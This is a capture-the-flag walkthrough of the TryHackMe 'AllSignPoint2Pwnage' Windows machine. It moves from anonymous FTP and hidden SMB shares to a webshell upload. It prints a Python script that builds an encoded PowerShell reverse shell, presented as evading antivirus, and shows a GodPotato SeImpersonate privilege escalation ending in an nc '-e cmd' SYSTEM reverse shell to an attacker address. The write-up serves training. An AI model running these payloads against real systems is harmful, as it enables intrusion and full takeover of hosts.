---
categories: [TryHackMe]
tags: [ SeImpersonatePrivilege, PrivEsc, SMB, Windows]
Level: 
media_subpath: /assets/images/
image:
  path: allsign.jpg
  width: "1200"
  height: "630"
  alt: Windows Easy Level Machine 😉
---
## Port Scan Results ⤵️
```bash

```
{: .nolineno}
## FTP Enumeration 🔽
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]
└─$ ftp 10.10.146.103
Connected to 10.10.146.103.
220 Microsoft FTP Service
Name (10.10.146.103:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49696|)
150 Opening ASCII mode data connection.
11-14-20  03:26PM                  173 notice.txt
226 Transfer complete.
ftp> get notice.txt
local: notice.txt remote: notice.txt
229 Entering Extended Passive Mode (|||49700|)
150 Opening ASCII mode data connection.
100% |*****************************************************************************|   173        0.22 KiB/s    00:00 ETA
226 Transfer complete.
173 bytes received in 00:00 (0.22 KiB/s)
ftp> exit
221 Goodbye.
```
{: .nolineno}
## Web Enumeration ⤵️

I opened the `notice.txt` file and here is some hints ->
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]
└─$ cat notice.txt                
NOTICE
======

Due to customer complaints about using FTP we have now moved 'images' to 
a hidden windows file share for upload and management 
of images.

- Dev Team 
```
{: .nolineno}
Lets do some digging into the SMB Shares and I got these shares which are hidden ->
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]
└─$ smbclient -L ////10.10.84.25//
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	images$         Disk      
	Installs$       Disk      
	IPC$            IPC       Remote IPC
	Users           Disk      
```
{: .nolineno}
I then accessed the images$ share and got these images that images can be found from the web also like this ->
![Image](Pasted%20image%2020240221213109.png)
_The site has a directory that is connected to SMB shares_
SMB Shares look like this , so I put the `webshell.php` file into it ->
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]
└─$ smbclient //10.10.84.25/images$ 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls -al
NT_STATUS_NO_SUCH_FILE listing \-al
smb: \> ls
  .                                   D        0  Wed Feb 21 20:33:23 2024
  ..                                  D        0  Wed Feb 21 20:33:23 2024
  internet-1028794_1920.jpg           A   134193  Mon Jan 11 03:22:24 2021
  man-1459246_1280.png                A   363259  Mon Jan 11 03:20:49 2021
  monitor-1307227_1920.jpg            A   691570  Mon Jan 11 03:20:29 2021
  neon-sign-4716257_1920.png          A  1461192  Mon Jan 11 03:23:59 2021
  webshell.php                        A    20320  Wed Feb 21 20:33:24 2024

		10861311 blocks of size 4096. 4124853 blocks available
smb: \> 
```
{: .nolineno}
Now lets access the <span style="color:#00ff91">webshell</span> from the site , I then performed the reverse shell command through this script file ->
![Image](Pasted%20image%2020240221213421.png)
_Webshell file_
The script is this that help me to evade Antivirus or Defender and generate a powershell payload in encrypted format like this 🔻
```python
┌──(kali🔥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]
└─$ cat payload.py                                  
#!/usr/bin/env python  {payload.py}
import base64
import sys

if len(sys.argv) < 3:
  print('usage : %s ip port' % sys.argv[0])
  sys.exit(0)

payload="""
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
""" % (sys.argv[1], sys.argv[2])

byte = payload.encode('utf-16-le')
b64 = base64.b64encode(byte)
print("powershell -exec bypass -enc %s" % b64.decode())
```
{: .nolineno}
{: file=payload.py}
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]
└─$ python3 payload.py 10.14.72.139 4444
powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADEANAAuADcAMgAuADEAMwA5ACcALAA0ADQANAA0ACkAOwAKACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwAuAFIAZQBhAGQAKAAkAGIALAAgADAALAAgACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACQAZAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABpAGUAeAAgACQAZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAgACsAIAAnAHAAcwA+ACAAJwApADsACgAgACAAIAAgACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQA7AAoAIAAgACAAIAAkAHMALgBGAGwAdQBzAGgAKAApAAoAfQA7AAoAJABjAC4AQwBsAG8AcwBlACgAKQAKAA==
```
{: .nolineno}
Now lets have a shell ->
![Image](Pasted%20image%2020240221213749.png)
```powershell
┌──(kali🔥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]
└─$ rlwrap nc -lvnp 4444    
listening on [any] 4444 ...
connect to [10.14.72.139] from (UNKNOWN) [10.10.84.25] 49744
ps> whoami
desktop-997gg7d\sign
ps> pwd
Path                  
----                  
C:\xampp\htdocs\images

ps> hostname
DESKTOP-997GG7D
ps>
ps> dir C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       14/11/2020     14:11                Administrator                                                         
d-r---       14/11/2020     13:14                Public                                                                
d-----       26/01/2021     18:19                sign                                                                  
ps> dir sign
ps> tree /f /a
Folder PATH listing
Volume serial number is 481F-824B
C:.
+---3D Objects
+---Contacts
+---Desktop
|       Microsoft Edge.lnk
|       user_flag.txt
|       
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |   
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|       
+---Music
+---OneDrive
+---Pictures
|   +---Camera Roll
|   \---Saved Pictures
+---Saved Games
+---Searches
|       winrt--{S-1-5-21-201290883-77286733-747258586-1001}-.searchconnector-ms
|       
\---Videos
ps>
```
{: .nolineno}
I checked the privileges this user has and I got this ->
```powershell
ps> whoami /all

USER INFORMATION
----------------

User Name            SID                                       
==================== ==========================================
desktop-997gg7d\sign S-1-5-21-201290883-77286733-747258586-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

ps>
```
{: .nolineno}
So this user have <span style="color:#ffff00">SeImpersonatePrivilege</span> Enabled so lets use that privilege to escalate to Administraotor user.
I will be using <span style="color:#fd77f8">God Potato</span> Tool to perform this attack ->
```powershell
ps> wget http://10.14.72.139/GodPotato-NET4.exe -o GodPotato-NET4.exe
ps> .\GodPotato-NET4.exe -cmd "cmd /c whoami"

[*] CombaseModule: 0x140710263586816
[*] DispatchTable: 0x140710265929424
[*] UseProtseqFunction: 0x140710265298800
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\e8a23d97-8087-4374-9781-a5fe212e83b1\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000e402-14ac-ffff-b282-1cd79fc647f8
[*] DCOM obj OXID: 0x60bf2126560bd17
[*] DCOM obj OID: 0x8b21d7be65d54b38
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1000 Token:0x448  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2136
ps>
```
{: .nolineno}
It is working fine so lets have a reverse shell of  `NT AUTHORITY\SYSTEM` user ->
```powershell
ps> .\GodPotato-NET4.exe -cmd "cmd /c C:\Users\sign\nc64.exe 10.14.72.139 2222 -e cmd"
[*] CombaseModule: 0x140710263586816
[*] DispatchTable: 0x140710265929424
[*] UseProtseqFunction: 0x140710265298800
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\8db06d03-3792-43fc-8109-9b7471bf9829\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00003802-19c4-ffff-dbbc-7b34cbc38088
[*] DCOM obj OXID: 0x3a11402b203ad703
[*] DCOM obj OID: 0xf0773c40263c446c
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1000 Token:0x448  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 6660
ps>
```
{: .nolineno}
In the netcat listener I got the reverse shell captured like this but the AV or Defender does not allow me to execute `whoami` command ->

```powershell
┌──(kali🔥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]
└─$ rlwrap nc -lvnp 2222    
listening on [any] 2222 ...
connect to [10.14.72.139] from (UNKNOWN) [10.10.84.25] 49880
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami

C:\Windows\system32>echo %username%
echo %username%
DESKTOP-997GG7D$

C:\Windows\system32>
C:\Windows\system32>cd C:\Users
cd C:\Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Users

11/14/2020  03:35 PM    <DIR>          .
11/14/2020  03:35 PM    <DIR>          ..
11/14/2020  02:11 PM    <DIR>          Administrator
11/14/2020  01:14 PM    <DIR>          Public
02/21/2024  03:30 PM    <DIR>          sign
               0 File(s)              0 bytes
               5 Dir(s)  16,888,754,176 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>
C:\Users\Administrator>tree /f /a
tree /f /a
Folder PATH listing
Volume serial number is 481F-824B
C:.
+---Desktop
|       admin_flag.txt
|       
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos

C:\Users\Administrator>type Desktop\admin_flag.txt
type Desktop\admin_flag.txt
thm{FLAG_FLAG_FLAG_FLAG_FLAG}
C:\Users\Administrator>
```
{: .nolineno}
I am Administrator Now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }